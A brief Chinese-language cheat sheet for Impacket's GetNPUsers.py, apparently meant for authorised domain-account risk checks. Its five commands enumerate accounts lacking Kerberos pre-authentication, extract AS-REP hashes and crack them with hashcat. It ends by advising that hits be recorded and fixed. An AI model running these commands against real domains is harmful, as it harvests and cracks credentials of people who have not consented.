# GetNPUsers.py 使用

GetNPUsers.py 用于检查 AS-REP Roast 条件，适合域内账号风险验证。

## 常用命令

```bash
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 192.168.1.10
```

```bash
GetNPUsers.py domain.local/user:pass -request -dc-ip 192.168.1.10
```

```bash
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
```

```bash
GetNPUsers.py -no-pass -usersfile users.txt domain.local/
```

```bash
hashcat -m 18200 asrep.txt wordlist.txt
```

命中后要记录账号、域控、时间和是否需要预认证，后续推动账号配置整改。
